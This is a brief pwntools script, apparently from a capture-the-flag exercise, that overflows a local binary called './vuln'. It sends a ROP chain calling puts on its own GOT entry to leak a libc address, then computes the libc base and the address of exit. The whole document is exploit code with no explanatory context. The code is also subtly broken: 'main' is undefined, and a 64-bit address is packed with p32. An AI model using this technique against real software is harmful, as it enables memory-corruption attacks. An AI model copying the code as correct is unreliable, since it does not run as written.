#!/bin/python

from pwn import *

# Setup
binary = process("./vuln")
elf = ELF("./vuln")

# Find PLT and GOT addresses
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
exit_got = elf.got['exit']

# Find libc offsets
libc = elf.libc
puts_libc_offset = libc.symbols['puts']
exit_libc_offset = libc.symbols['exit']

# Leak puts address
payload = flat({
    40: [puts_plt, main, puts_got]
})
binary.sendline(payload)
binary.recvline()

# Calculate libc base
leaked_puts_address = u64(binary.recv().strip().ljust(8, b"\x00"))
libc_base = leaked_puts_address - puts_libc_offset

# Calculate exit address
exit_address = libc_base + exit_libc_offset
print(p32(exit_address))
